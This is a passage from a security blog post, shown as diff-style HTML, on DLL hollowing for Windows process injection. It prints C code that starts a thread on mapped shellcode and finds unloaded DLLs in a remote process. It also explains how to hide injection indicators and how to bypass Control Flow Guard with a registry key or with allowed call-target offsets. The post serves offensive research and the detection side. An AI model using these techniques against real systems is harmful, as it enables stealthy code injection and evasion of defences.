+<span class="k">if</span><span class="w"> </span><span class="p">(</span><span class="n">CloseHandle</span><span class="p">(</span><span class="n">hSection</span><span class="p">)</span><span class="w"> </span><span class="o">==</span><span class="w"> </span><span class="mi">0</span><span class="p">)</span><span class="w"> </span><span class="p">{</span>
+<span class="w">	</span><span class="c1">// this is not a fatal error</span>
+<span class="w">	</span><span class="n">printf</span><span class="p">(</span><span class="s">"CloseHandle: %lu</span><span class="se">\n</span><span class="s">"</span><span class="p">,</span><span class="w"> </span><span class="n">GetLastError</span><span class="p">());</span>
+<span class="p">}</span>
+
+<span class="n">printf</span><span class="p">(</span><span class="s">"Shellcode is @ 0x%p</span><span class="se">\n</span><span class="s">"</span><span class="p">,</span><span class="w"> </span><span class="n">mapped</span><span class="p">);</span>
+
+<span class="c1">// Create the thread</span>
+<span class="n">status</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="n">NtCreateThreadEx</span><span class="p">(</span>
+<span class="w">	</span><span class="o">&amp;</span><span class="n">hThread</span><span class="p">,</span><span class="w">       </span><span class="c1">// returns thread handle</span>
+<span class="w">	</span><span class="n">GENERIC_ALL</span><span class="p">,</span><span class="w">    </span><span class="c1">// access rights</span>
+<span class="w">	</span><span class="mi">0</span><span class="p">,</span>
+<span class="w">	</span><span class="n">hProcess</span><span class="p">,</span><span class="w">       </span><span class="c1">// handle of process</span>
+<span class="w">	</span><span class="p">(</span><span class="n">LPTHREAD_START_ROUTINE</span><span class="p">)</span><span class="n">mapped</span><span class="p">,</span><span class="w"> </span><span class="c1">// thread start address</span>
+<span class="w">	</span><span class="nb">NULL</span><span class="p">,</span><span class="w">    </span><span class="c1">// thread user defined parameter</span>
+<span class="w">	</span><span class="n">FALSE</span><span class="p">,</span><span class="w">          </span><span class="c1">// start immediately (don't create suspended)</span>
+<span class="w">	</span><span class="mi">0</span><span class="p">,</span>
+<span class="w">	</span><span class="mi">0</span><span class="p">,</span>
+<span class="w">	</span><span class="mi">0</span><span class="p">,</span>
+<span class="w">	</span><span class="nb">NULL</span>
+<span class="p">);</span>
+<span class="k">if</span><span class="w"> </span><span class="p">(</span><span class="o">!</span><span class="n">NT_SUCCESS</span><span class="p">(</span><span class="n">status</span><span class="p">))</span>
+<span class="p">{</span>
+<span class="w">	</span><span class="c1">// ERROR</span>
+<span class="w">	</span><span class="n">printf</span><span class="p">(</span><span class="s">"ERROR: NtCreateThreadEx = 0x%x</span><span class="se">\n</span><span class="s">"</span><span class="p">,</span><span class="w"> </span><span class="n">status</span><span class="p">);</span>
+<span class="w">	</span><span class="k">return</span><span class="w"> </span><span class="nb">NULL</span><span class="p">;</span>
+<span class="p">}</span>
+</pre></div>
+
+	</section>
+	
+	<section class="section-content container section-post-content text-editor-content">	
+		
+<p data-block-key="xthcw">It should be noted that, after this operation, the content of the overloaded DLL in RAM and on the disk are different. In addition, using the code showed above, there will be another three IOCs (Indicators of Compromise), namely:</p><ul><li data-block-key="fjka4">The list of loaded modules stored in the PEB will not contain the sacrificial DLL we mapped to host our payload.<ul><li data-block-key="5147k">This IOC could be removed by adding the module to the PEB lists.</li></ul></li><li data-block-key="55k6r">Since the payload has been written at the beginning of the sacrificial DLL, we will overwrite its PE headers.<ul><li data-block-key="2ud92">This IOC could be removed by writing the payload after the PE header.</li></ul></li><li data-block-key="c94o5">There will be a mismatch between the expected protection of the DLL sections and the actual memory protection that is applied in order to execute our payload.<ul><li data-block-key="bj2ue">This IOC could be removed by being consistent with the DLL’s PE headers when changing the memory protection to execute our payload.</li></ul></li></ul><p data-block-key="9pucf">It should be noted that one simple solution to address the last two IOCs is storing the payload in the text section of the DLL (assuming the text section is big enough to store the payload).</p><p data-block-key="7hndq">Moreover, if we address the IOC associated with PEB’s list of loaded modules, the only way to identify the injection is to compare the contents on disk with the contents in RAM for each DLL loaded by the process (e.g. Hasherezade’s <a href="https://github.com/hasherezade/hollows_hunter">hollows_hunter</a>, Forrest-orr’s <a href="https://github.com/forrest-orr/moneta">Moneta</a> or Volatility’s Hollowfind).</p><p data-block-key="9sdfu">Below we show some screenshots taken when using Forrest-orr’s <a href="https://github.com/forrest-orr/moneta">Moneta</a></p><p data-block-key="7na4v"><b>Payload written at the beginning of the DLL and DLL not added to PEB</b></p><img alt="Moneta - Payload written at the beginning of the DLL and DLL not added to PEB" class="richtext-image full-width" height="167" src="https://www.secforce.com/media/images/1_eeCu35c.width-800.png" width="800"><p data-block-key="9j4f4"><b>Payload written at the beginning of the DLL and DLL added to PEB</b></p><img alt="Moneta - Payload written at the beginning of the DLL  and DLL added to PEB" class="richtext-image full-width" height="175" src="https://www.secforce.com/media/images/2.width-800.png" width="800"><p data-block-key="5be3f"><b>Payload written in the .text section of the DLL and DLL added to PEB</b></p><img alt="Moneta - Payload written in the .text section of the DLL  and DLL added to PEB" class="richtext-image full-width" height="211" src="https://www.secforce.com/media/images/3_qS24TeS.width-800.png" width="800"><p data-block-key="91egq">Finally, the following figure shows what memory looks like when it is allocated with <code>NtAllocateVirtualMemory</code>. The allocated memory region is flagged as Private with the state field of <code>MEMORY_BASIC_INFORMATION</code> set to <code>MEM_COMMIT</code>.</p><img alt="NtAllocateVirtualMemory - Memory Layout" class="richtext-image full-width" height="118" src="https://www.secforce.com/media/images/4_982rRNK.width-800.png" width="374"><p data-block-key="eal1n">On the other hand, the <i>DLL hollowing</i> technique allocates memory flagged as Image (with the state field of <code>MEMORY_BASIC_INFORMATION</code> set to <code>MEM_COMMIT</code>) making it indistinguishable from the memory allocated by the system to load DLL libraries.</p><p data-block-key="5c2oi"><b>Memory allocated with DLL Hollow</b></p><img alt="DLL Hollow - Memory Layout" class="richtext-image full-width" height="185" src="https://www.secforce.com/media/images/5_Wxp2A2z.width-800.png" width="530"><p data-block-key="doa80"><b>Legit ntdll.dll loaded into notepad.exe</b></p><img alt="NTDLL.dll - Memory Layout" class="richtext-image full-width" height="153" src="https://www.secforce.com/media/images/6_uKtRHmg.width-800.png" width="571"><p data-block-key="2cgho"></p>
+
+	</section>
+	
+	<section class="section-content container section-post-content text-editor-content">	
+		
+<h2 data-block-key="eep3h">Going Remote</h2><p data-block-key="8g2h3">Moving the same concepts to remote process injection <i>should be</i> quite easy since the system call we are using allows us to pass a handle to a target process. Therefore, we just need to get a handle to the target process (<code>NtOpenProcess</code> can do the job) and then pass it to <code>NtMapViewOfSection</code>. Simple, isn’t it?</p><p data-block-key="ajo6j">However, the devil is in the details and we have to address two main issues:</p><ol><li data-block-key="7mafk">How to get a DLL that is not already loaded into the remote process? (Note: It is not necessary to use a DLL that was not already loaded but a process with the same DLL mapped twice in memory may look suspicious)<br></li><li data-block-key="860ku">Injecting into <i>some</i> processes <i>might</i> cause crashes with error <code>0xC0000409 STATUS_STACK_BUFFER_OVERRUN</code><br></li></ol><p data-block-key="548k9">The first issue was solved thanks to <a href="https://github.com/thereals0beit/RemoteFunctions/blob/master/Remote.cpp">thereals0beit</a>.</p><p data-block-key="qlrt">The function <code>GetRemoteModuleHandleW</code>, as the name suggests, allows us to get a handle to a module loaded in a remote process.</p>
+
+	</section>
+	
+	<section class="section-content container section-post-content text-editor-content">	
+		<div class="code syntax"><pre><span></span><span class="n">HMODULE</span><span class="w"> </span><span class="nf">GetRemoteModuleHandleW</span><span class="p">(</span><span class="n">HANDLE</span><span class="w"> </span><span class="n">hProcess</span><span class="p">,</span><span class="w"> </span><span class="k">const</span><span class="w"> </span><span class="kt">wchar_t</span><span class="o">*</span><span class="w"> </span><span class="n">szModule</span><span class="p">)</span>
+<span class="p">{</span>
+<span class="w">    </span><span class="c1">// https://github.com/thereals0beit/RemoteFunctions/blob/master/Remote.cpp</span>
+<span class="w">    </span><span class="n">HANDLE</span><span class="w"> </span><span class="n">tlh</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="n">CreateToolhelp32Snapshot</span><span class="p">(</span><span class="n">TH32CS_SNAPMODULE</span><span class="p">,</span><span class="w"> </span><span class="n">GetProcessId</span><span class="p">(</span><span class="n">hProcess</span><span class="p">));</span>
+
+<span class="w">    </span><span class="n">MODULEENTRY32</span><span class="w"> </span><span class="n">modEntry</span><span class="p">;</span>
+
+<span class="w">    </span><span class="n">modEntry</span><span class="p">.</span><span class="n">dwSize</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="k">sizeof</span><span class="p">(</span><span class="n">MODULEENTRY32</span><span class="p">);</span>
+
+<span class="w">    </span><span class="n">Module32First</span><span class="p">(</span><span class="n">tlh</span><span class="p">,</span><span class="w"> </span><span class="o">&amp;</span><span class="n">modEntry</span><span class="p">);</span>
+<span class="w">    </span><span class="k">do</span>
+<span class="w">    </span><span class="p">{</span>
+<span class="w">        </span><span class="k">if</span><span class="w"> </span><span class="p">(</span><span class="n">_wcsicmp</span><span class="p">(</span><span class="n">szModule</span><span class="p">,</span><span class="w"> </span><span class="p">(</span><span class="k">const</span><span class="w"> </span><span class="kt">wchar_t</span><span class="o">*</span><span class="p">)</span><span class="n">modEntry</span><span class="p">.</span><span class="n">szModule</span><span class="p">)</span><span class="w"> </span><span class="o">==</span><span class="w"> </span><span class="mi">0</span><span class="p">)</span>
+<span class="w">        </span><span class="p">{</span>
+<span class="w">            </span><span class="n">printf</span><span class="p">(</span><span class="s">"Remote Module %s Found! @ </span><span class="se">\n</span><span class="s">"</span><span class="p">,</span><span class="w"> </span><span class="n">modEntry</span><span class="p">.</span><span class="n">modBaseAddr</span><span class="p">);</span>
+<span class="w">            </span><span class="n">CloseHandle</span><span class="p">(</span><span class="n">tlh</span><span class="p">);</span>
+
+<span class="w">            </span><span class="k">return</span><span class="w"> </span><span class="n">modEntry</span><span class="p">.</span><span class="n">hModule</span><span class="p">;</span>
+<span class="w">        </span><span class="p">}</span>
+<span class="w">    </span><span class="p">}</span><span class="w"> </span><span class="k">while</span><span class="w"> </span><span class="p">(</span><span class="n">Module32Next</span><span class="p">(</span><span class="n">tlh</span><span class="p">,</span><span class="w"> </span><span class="o">&amp;</span><span class="n">modEntry</span><span class="p">));</span>
+
+<span class="w">    </span><span class="n">CloseHandle</span><span class="p">(</span><span class="n">tlh</span><span class="p">);</span>
+
+<span class="w">    </span><span class="k">return</span><span class="w"> </span><span class="nb">NULL</span><span class="p">;</span>
+<span class="p">}</span>
+</pre></div>
+
+	</section>
+	
+	<section class="section-content container section-post-content text-editor-content">	
+		
+<p data-block-key="eep3h">The code above will return <code>NULL</code> if the module is not loaded. This is the primitive we need, to find a good candidate for a sacrificial DLL. We can cycle over the DLLs stored under the system32 directory doing the following check:</p>
+
+	</section>
+	
+	<section class="section-content container section-post-content text-editor-content">	
+		<div class="code syntax"><pre><span></span><span class="k">if</span><span class="p">(</span><span class="n">GetRemoteModuleHandleW</span><span class="p">(</span><span class="n">hProcess</span><span class="p">,</span><span class="w"> </span><span class="n">dllName</span><span class="p">)</span><span class="w"> </span><span class="o">==</span><span class="w"> </span><span class="nb">NULL</span><span class="p">)</span>
+<span class="p">{</span>
+<span class="w">    </span><span class="c1">// Sacfricial DLL found!</span>
+<span class="p">}</span>
+</pre></div>
+
+	</section>
+	
+	<section class="section-content container section-post-content text-editor-content">	
+		
+<p data-block-key="6vpfg">We can now complete the function <code>isDllLoaded</code>.</p>
+
+	</section>
+	
+	<section class="section-content container section-post-content text-editor-content">	
+		<div class="code syntax"><pre><span></span><span class="cm">/*</span>
+<span class="cm">	Return TRUE if the DLL is loaded. FALSE otherwise</span>
+<span class="cm">*/</span>
+<span class="n">BOOL</span><span class="w"> </span><span class="nf">isDllLoaded</span><span class="p">(</span><span class="n">HANDLE</span><span class="w"> </span><span class="n">hProcess</span><span class="p">,</span><span class="w"> </span><span class="kt">wchar_t</span><span class="o">*</span><span class="w"> </span><span class="n">filePath</span><span class="p">)</span><span class="w"> </span><span class="p">{</span>
+<span class="w">	</span><span class="c1">// Local</span>
+<span class="w">	</span><span class="k">if</span><span class="w"> </span><span class="p">(</span><span class="n">hProcess</span><span class="w"> </span><span class="o">==</span><span class="w"> </span><span class="p">(</span><span class="n">HANDLE</span><span class="p">)</span><span class="mi">-1</span><span class="p">)</span><span class="w"> </span><span class="k">return</span><span class="w"> </span><span class="n">GetModuleHandleW</span><span class="p">(</span><span class="n">filePath</span><span class="p">)</span><span class="w"> </span><span class="o">!=</span><span class="w"> </span><span class="nb">NULL</span><span class="p">;</span>
+<span class="w">	</span><span class="c1">// remote</span>
+<span class="w">	</span><span class="k">else</span><span class="w"> </span><span class="k">return</span><span class="w"> </span><span class="n">GetRemoteModuleHandleW</span><span class="p">(</span><span class="n">hProcess</span><span class="p">,</span><span class="w"> </span><span class="n">filePath</span><span class="p">)</span><span class="w"> </span><span class="o">!=</span><span class="w"> </span><span class="nb">NULL</span><span class="p">;</span>
+<span class="p">}</span>
+</pre></div>
+
+	</section>
+	
+	<section class="section-content container section-post-content text-editor-content">	
+		
+<p data-block-key="eep3h">The second issue, however, is slightly more complicated and we need some more knowledge to address it.</p><p data-block-key="fs2b0"></p>
+
+	</section>
+	
+	<section class="section-content container section-post-content text-editor-content">	
+		
+<h2 data-block-key="rg8p0">DLL Hollowing - Crash Debug</h2><p data-block-key="2vmht">Injecting into some processes caused a crash. To trace the root cause of the crash we can use <i>x64dbg</i> to debug the remote process.</p><p data-block-key="bsgig">Since our code created a new thread to execute the payload, we set a breakpoint at <code>kernel32.dll!BaseThreadInitThunk</code> and then followed the execution inside the debugger to trace which functions were called.</p><p data-block-key="7qv6d">After some steps, the function <code>ntdll.dll!LdrControlFlowGuardEnforced</code> is called</p><img alt="x64dbg ntdll.dll!LdrControlFlowGuardEnforced called" class="richtext-image full-width" height="115" src="https://www.secforce.com/media/images/x64dbg_ntdll.dllLdrControlFlowGuardEnforced_ca.width-800.png" width="800"><p data-block-key="bd645">and the program will crash throwing the exception <code>0xC0000409 STATUS_STACK_BUFFER_OVERRUN</code></p><img alt="x64dbg crash with STATUS_STACK_BUFFER_OVERRUN" class="richtext-image full-width" height="255" src="https://www.secforce.com/media/images/x64dbg_cfg_STATUS_STACK_BUFFER_OVERRUN.width-800.png" width="800"><p data-block-key="28j2d"></p><p data-block-key="beog7">To further investigate what happens we can use <i>WinDbg</i>.</p><p data-block-key="8v640">To simplify the debugging process we created a Visual Studio project implementing local DLL Hollowing injection and we compiled the code enabling CFG.</p><p data-block-key="a4jbk">After calling <code>NtCreateThreadEx</code>, the system will start the thread creation and, as we already know from the above, <code>KERNEL32!BaseThreadInitThunk</code> will be called.</p><p data-block-key="ef7e7">We set a breakpoint at <code>KERNEL32!BaseThreadInitThunk</code>;</p>
+
+	</section>
+	
+	<section class="section-content container section-post-content text-editor-content">	
+		<div class="code syntax"><pre><span></span>bp KERNEL32!BaseThreadInitThunk
+</pre></div>
+
+	</section>
+	
+	<section class="section-content container section-post-content text-editor-content">	
+		
+<p data-block-key="2d299"><code>KERNEL32!BaseThreadInitThunk</code> makes a call to <code>KERNEL32!_guard_dispatch_icall_fptr</code></p><img alt="WinDBG KERNEL32!BaseThreadInitThunk" class="richtext-image full-width" height="244" src="https://www.secforce.com/media/images/KERNEL32BaseThreadInitThunk.width-800.png" width="800"><p data-block-key="5lr37"></p><p data-block-key="dt633">The function actually points to <code>ntdll!LdrpDispatchUserCallTarget</code></p><img alt="WinDBG ntdll!LdrpDispatchUserCallTarget" class="richtext-image full-width" height="87" src="https://www.secforce.com/media/images/ntdllLdrpDispatchUserCallTarget.width-800.png" width="800"><p data-block-key="eevpi"></p><p data-block-key="6uf8b">This function implements the bitmap check using the symbol <code>ntdll!LdrSystemDllInitBlock</code> (reference <a href="https://habr.com/ru/company/dsec/blog/305960/">here</a>)</p><img alt="WinDBG ntdll!LdrSystemDllInitBlock" class="richtext-image full-width" height="60" src="https://www.secforce.com/media/images/WinDBG_ntdllLdrSystemDllInitBlock.width-800.png" width="800"><p data-block-key="bt8ie"></p><p data-block-key="532fh">The bitmap lookup will fail and the function <code>ntdll!RtlpHandleInvalidUserCallTarget</code> will be called.</p><img alt="WinDBG ntdll!RtlpHandleInvalidUserCallTarget" class="richtext-image full-width" height="176" src="https://www.secforce.com/media/images/ntdllRtlpHandleInvalidUserCallTarget.width-800.png" width="800"><p data-block-key="5f15f"></p><p data-block-key="7uor2">Eventually, <code>ntdll!LdrControlFlowGuardEnforced</code> is called</p><img alt="WinDBG ntdll!LdrControlFlowGuardEnforced" class="richtext-image full-width" height="113" src="https://www.secforce.com/media/images/windbg_ntdllLdrControlFlowGuardEnforced.width-800.png" width="800"><p data-block-key="5ch4k"></p><p data-block-key="cojpj">and the process will crash triggering an exception.</p><img alt="WinDBG crash" class="richtext-image full-width" height="336" src="https://www.secforce.com/media/images/windbg_crash.width-800.png" width="800"><p data-block-key="6r57c"></p><p data-block-key="8kcp6"><b>This means that CFG blocked our execution!!</b></p><p data-block-key="cgjr6"></p>
+
+	</section>
+	
+	<section class="section-content container section-post-content text-editor-content">	
+		
+<h2 data-block-key="demey">Control Flow Guard (CFG)</h2><h3 data-block-key="60fpt">What is it?</h3><p data-block-key="5h4e6">CFG is an exploit protection mechanism that is used to block exploitation techniques such as ROP gadgets. Since we are executing code inside an injected module mapped into the remote process address space, this technique is similar to the concept of ROP as we are subverting the execution flow to execute code that was not supposed to be executed.</p><p data-block-key="1e8s4">NB: Allocating Memory with <code>VirtualAlloc</code> (<code>NtAllocateVirtualMemory</code>) allows us to inject memory into a remote process without having to deal with CFG because that kind of memory is supposed to be allowed for execution (<a href="https://docs.microsoft.com/en-us/windows/win32/secbp/control-flow-guard">MS reference</a>).</p><p data-block-key="2150k">We won’t go into details about the CFG in this blog post as there are many well-explained articles on the topic from both an offensive and defensive perspective (<a href="https://docs.microsoft.com/en-us/windows/security/threat-protection/microsoft-defender-atp/exploit-protection-reference#control-flow-guard-cfg">This MS Article</a>, as well as <a href="https://www.fortinet.com/blog/threat-research/documenting-the-undocumented-adding-cfg-exceptions">this blog post</a> and <a href="https://www.fortinet.com/blog/threat-research/atombombing-cfg-protected-processes">this</a>, <a href="https://www.trendmicro.com/en_us/research/15/a/exploring-control-flow-guard-in-windows-10.html">this</a> and also <a href="https://sjc1-te-ftp.trendmicro.com/assets/wp/exploring-control-flow-guard-in-windows10.pdf">this</a>).</p><p data-block-key="8qf6f">To prove that our injected code is failing due to CFG, we can compile a PE with CFG enabled (this <a href="https://docs.microsoft.com/en-us/cpp/build/reference/guard-enable-control-flow-guard?view=msvc-160">MS article</a> explains how to do that) and see what happens when we try to inject shellcode into a process compiled in this way.</p><p data-block-key="ffdlm">After compiling our CFG-enabled binary we can check that CFG is actually in place using the <i>dumpbin</i> tool:</p>
+
+	</section>
+	
+	<section class="section-content container section-post-content text-editor-content">	
+		<div class="code syntax"><pre><span></span>dumpbin /headers /loadconfig C:\dummyPE.exe
+</pre></div>
+
+	</section>
+	
+	<section class="section-content container section-post-content text-editor-content">	
+		
+<p data-block-key="demey"></p><img alt="dumpbin cfg enabled" class="richtext-image full-width" height="203" src="https://www.secforce.com/media/images/dumpbin_cfg_enabled.width-800.png" width="380"><p data-block-key="6qvb7"></p><img alt="dumpbin cfg details" class="richtext-image full-width" height="641" src="https://www.secforce.com/media/images/dumpbin_cfg_details.width-800.png" width="535"><p data-block-key="cs41m">We can verify that injection into <code>dummyPE.exe</code> using DLL Hollowing will indeed fail with <code>NT_STATUS 0xC0000409, STATUS_STACK_BUFFER_OVERRUN</code> if we don’t bypass CFG.</p><p data-block-key="5grj4"></p><img alt="x64dbg cfg crash STATUS_STACK_BUFFER_OVERRUN" class="richtext-image full-width" height="371" src="https://www.secforce.com/media/images/x64dbg_cfg_crash_buffer_overrrun.width-800.png" width="800"><p data-block-key="eq4fh"></p>
+
+	</section>
+	
+	<section class="section-content container section-post-content text-editor-content">	
+		
+<h2 data-block-key="demey">Checking if CFG is enabled</h2><h3 data-block-key="6q7f8">Dumpbin</h3>
+
+	</section>
+	
+	<section class="section-content container section-post-content text-editor-content">	
+		<div class="code syntax"><pre><span></span>dumpbin /headers /loadconfig C:\dummyPE.exe
+</pre></div>
+
+	</section>
+	
+	<section class="section-content container section-post-content text-editor-content">	
+		
+<h3 data-block-key="demey">Python</h3><p data-block-key="fl1f9">The following Python script - kindly borrowed from stackexchange :) - uses the pefile library and will show a PE’s protections:</p>
+
+	</section>
+	
+	<section class="section-content container section-post-content text-editor-content">	
+		<div class="code syntax"><pre><span></span><span class="c1"># https://reverseengineering.stackexchange.com/questions/9293/how-use-pefile-to-check-for-nx-aslr-safeseh-and-cfg-control-flow-guard-flag</span>
+<span class="kn">import</span><span class="w"> </span><span class="nn">os.path</span>
+<span class="kn">import</span><span class="w"> </span><span class="nn">sys</span>
+<span class="kn">import</span><span class="w"> </span><span class="nn">pefile</span>
+
+<span class="k">class</span><span class="w"> </span><span class="nc">PESecurityCheck</span><span class="p">:</span>
+  <span class="n">IMAGE_DLLCHARACTERISTICS_GUARD_CF</span> <span class="o">=</span> <span class="mh">0x4000</span>
+
+  <span class="k">def</span><span class="w"> </span><span class="fm">__init__</span><span class="p">(</span><span class="bp">self</span><span class="p">,</span><span class="n">pe</span><span class="p">):</span>
+    <span class="bp">self</span><span class="o">.</span><span class="n">pe</span> <span class="o">=</span> <span class="n">pe</span>
+
+  <span class="k">def</span><span class="w"> </span><span class="nf">CFG</span><span class="p">(</span><span class="bp">self</span><span class="p">):</span>
+    <span class="k">return</span> <span class="nb">bool</span><span class="p">(</span><span class="bp">self</span><span class="o">.</span><span class="n">pe</span><span class="o">.</span><span class="n">OPTIONAL_HEADER</span><span class="o">.</span><span class="n">DllCharacteristics</span> <span class="o">&amp;</span> <span class="bp">self</span><span class="o">.</span><span class="n">IMAGE_DLLCHARACTERISTICS_GUARD_CF</span><span class="p">)</span>
+
+
+<span class="k">if</span> <span class="nb">len</span><span class="p">(</span><span class="n">sys</span><span class="o">.</span><span class="n">argv</span><span class="p">)</span> <span class="o">&lt;</span> <span class="mi">2</span><span class="p">:</span>
+  <span class="nb">print</span><span class="p">(</span><span class="s1">'Usage: </span><span class="si">%s</span><span class="s1"> &lt;file_path&gt;'</span> <span class="o">%</span> <span class="n">sys</span><span class="o">.</span><span class="n">argv</span><span class="p">[</span><span class="mi">0</span><span class="p">])</span>
+  <span class="c1">#sys.exit()</span>
+
+<span class="k">def</span><span class="w"> </span><span class="nf">main</span><span class="p">():</span>
+  <span class="n">file_path</span> <span class="o">=</span> <span class="n">sys</span><span class="o">.</span><span class="n">argv</span><span class="p">[</span><span class="mi">1</span><span class="p">]</span>   
+
+  <span class="k">try</span><span class="p">:</span>
+    <span class="k">if</span> <span class="n">os</span><span class="o">.</span><span class="n">path</span><span class="o">.</span><span class="n">isfile</span><span class="p">(</span><span class="n">file_path</span><span class="p">):</span>
+      <span class="n">pe</span> <span class="o">=</span> <span class="n">pefile</span><span class="o">.</span><span class="n">PE</span><span class="p">(</span><span class="n">file_path</span><span class="p">,</span><span class="kc">True</span><span class="p">)</span>
+    <span class="k">else</span><span class="p">:</span>
+      <span class="nb">print</span><span class="p">(</span><span class="s2">"File '</span><span class="si">%s</span><span class="s2">' not found!"</span> <span class="o">%</span> <span class="n">file_path</span><span class="p">)</span>     
+      <span class="c1">#sys.exit()  </span>
+  <span class="k">except</span> <span class="n">pefile</span><span class="o">.</span><span class="n">PEFormatError</span><span class="p">:</span>
+    <span class="nb">print</span><span class="p">(</span><span class="s2">"Not a PE file!"</span><span class="p">)</span>
+    <span class="c1">#sys.exit()  </span>
+
+  <span class="n">ps</span> <span class="o">=</span> <span class="n">PESecurityCheck</span><span class="p">(</span><span class="n">pe</span><span class="p">)</span>
+
+  <span class="k">if</span> <span class="n">ps</span><span class="o">.</span><span class="n">CFG</span><span class="p">():</span>
+    <span class="nb">print</span><span class="p">(</span><span class="s2">"[+]CFG Enabled"</span><span class="p">)</span>
+  <span class="k">else</span><span class="p">:</span>
+    <span class="nb">print</span><span class="p">(</span><span class="s2">"[-] CFG Not Enabled"</span><span class="p">)</span>
+
+<span class="k">if</span> <span class="vm">__name__</span> <span class="o">==</span> <span class="s1">'__main__'</span><span class="p">:</span>
+  <span class="n">main</span><span class="p">()</span>
+</pre></div>
+
+	</section>
+	
+	<section class="section-content container section-post-content text-editor-content">	
+		
+<h2 data-block-key="obg93">Bypassing CFG</h2><h3 data-block-key="8nclq">Disabling CFG using a Registry Key</h3><p data-block-key="59qt2">The simplest way to execute arbitrary code into a CFG-enabled process is to disable it by creating a registry key (<a href="https://social.microsoft.com/Forums/Azure/it-IT/d8f6e240-7b87-4882-bd0d-3dee364fd923/exception-codec0000409-exception-data0000000a?forum=clr">source</a>)</p><ul><li data-block-key="2t62v">Create a <code>&lt;PROGRAM&gt;.exe</code> key under <code>HKEY_LOCAL_MACHINE\SOFTWARE\Microsoft\Windows NT\CurrentVersion\Image File Execution Options</code><br></li></ul><p data-block-key="2stai"><code>HKEY_LOCAL_MACHINE\SOFTWARE\Microsoft\Windows NT\CurrentVersion\Image File Execution Options\&lt;PROGRAM&gt;.exe</code></p><ul><li data-block-key="65nsg">In this location, create a QWORD named <code>MitigationOptions</code><br></li><li data-block-key="ejfmh">Set the value to 20000000000 (hex) (0x20000000000)<br></li></ul><p data-block-key="4ad9n">No reboot should be required and this will disable CFG for this process (both 64 and 32 bit).</p><p data-block-key="aub9g"></p><img alt="disable cfg - set registry key" class="richtext-image full-width" height="329" src="https://www.secforce.com/media/images/disable_cfg_set_registry_key.width-800.png" width="800"><p data-block-key="lerg">Disabling it we get execution working!</p><p data-block-key="dsk1s"></p><img alt="execute with cfg disabled using registry key" class="richtext-image full-width" height="337" src="https://www.secforce.com/media/images/cfg_disabled_registry_key_exec.width-800.png" width="800"><p data-block-key="dgqoe"></p>
+
+	</section>
+	
+	<section class="section-content container section-post-content text-editor-content">	
+		
+<h3 data-block-key="obg93">Bypassing CFG by writing to allowed addresses</h3><p data-block-key="bh5el">In the following section we will target only 64 bit processes.</p><p data-block-key="b0kia">Every PE contains, in its PE header, the information on CFG. In particular, this information resides in a flag inside <code>DLL_CHARACTERISTICS</code>.</p><p data-block-key="a15bf">As already mentioned, we can inspect CFG configuration by reading the PE headers using the <i>dumpBin</i> Visual Studio tool.</p>
+
+	</section>
+	
+	<section class="section-content container section-post-content text-editor-content">	
+		<div class="code syntax"><pre><span></span>dumpbin /headers /loadconfig C:\windows\system32\notepad.exe
+</pre></div>
+
+	</section>
+	
+	<section class="section-content container section-post-content text-editor-content">	
+		
+<p data-block-key="dl6fr"></p><img alt="Dumpbin general information" class="richtext-image full-width" height="696" src="https://www.secforce.com/media/images/allowed_addresses_-_dumpbin_general.width-800.png" width="559"><p data-block-key="3qr49">If the module is compiled with CFG enabled, a list of functions that are valid for indirect calls are stored in the .gfids PE section (which by default is merged with the .rdata section by the linker) [Source: <a href="https://www.oreilly.com/library/view/windows-internals-seventh/9780133986471/">Windows Internals Part 1</a>, Ch 7 pag 741].</p><p data-block-key="664ej">The following output is obtained by running dumpbin on a CFG enabled PE:</p><img alt="Dumpbin allowed addresses" class="richtext-image full-width" height="304" src="https://www.secforce.com/media/images/allowed_addresses_-_dumpbin_allowed_addresses.width-800.png" width="300"><p data-block-key="drdqg">However, if a module is compiled without CFG (which is the default in Visual Studio), the validation allows any address in the PE to be a target for indirect calls. As discussed <a href="https://improsec.com/tech-blog/bypassing-control-flow-guard-on-windows-10-part-ii">here</a>:</p>
+
+	</section>
+	
+	<section class="section-content container section-post-content text-editor-content">	
+		<div class="code syntax"><pre><span></span>[...] the CFG validation bitmap corresponding to a module that is compiled without CFG is to allow all addresses [...]
+</pre></div>
+
+	</section>
+	
+	<section class="section-content container section-post-content text-editor-content">	
+		
+<p data-block-key="50dv2">In order to test how to bypass CFG we will use a dummy PE compiled with CFG enabled.</p><p data-block-key="59l19">To get the offsets of the allowed addresses we used <i>PE-bear</i>. The table containing allowed offsets can be found in the .rsrc section under the <code>LoadConfig</code> tab in the <code>GuardCFFunctionTable</code> field.</p><p data-block-key="2cjqc"></p><img alt="PE-bear allowed addresses" class="richtext-image full-width" height="572" src="https://www.secforce.com/media/images/allowed_addresses_-_PEbear.width-800.png" width="800"><p data-block-key="c7g31"></p><p data-block-key="eesj1">Using an offset not present in the table (e.g. <code>0x1234</code>) will cause a crash.</p><p data-block-key="e2e2p"></p><img alt="wiritng to not allowed addresses" class="richtext-image full-width" height="345" src="https://www.secforce.com/media/images/wiritng_to_not_allowed_addresses_1.width-800.png" width="800"><p data-block-key="4vg85"></p><img alt="writing to not allowed addresses crash" class="richtext-image full-width" height="401" src="https://www.secforce.com/media/images/wiritng_to_not_allowed_addresses_crash.width-800.png" width="800"><p data-block-key="97jdj"></p><p data-block-key="d4d41">If we write the shellcode at the address <code>[dummyPE base address] + [allowed offset]</code> (e.g. <code>0x10d0</code>) we successfully achieve code execution.</p><p data-block-key="3u7cd"></p><img alt="writing to allowed addresses" class="richtext-image full-width" height="355" src="https://www.secforce.com/media/images/wiritng_to_allowed_addresses_1.width-800.png" width="800"><p data-block-key="fg4h4"></p><img alt="writing to allowed addresses exec" class="richtext-image full-width" height="364" src="https://www.secforce.com/media/images/wiritng_to_allowed_addresses_exec.width-800.png" width="800"><p data-block-key="etuat"></p><p data-block-key="7eg1l">Based on the previous discussion, we could successfully achieve code execution into a remote process by:</p><ul><li data-block-key="bpaeq">Injecting into a non-CFG process<br></li><li data-block-key="7aa0">Overwriting the CFG bitmap in remote process memory<br></li><li data-block-key="8vusu">Writing our payload to an allowed address<br></li></ul><p data-block-key="7l7jg">However, all of those solutions have pitfalls:</p><ul><li data-block-key="6rbdb">We cannot inject only into non-CFG PEs as this will be a huge limitation.<br></li><li data-block-key="acvhr">Editing the bitmap is not possible! The memory area is flagged as <i>Read Only</i>, so we should call <code>NtProtectVirtualMemory</code> to enable write 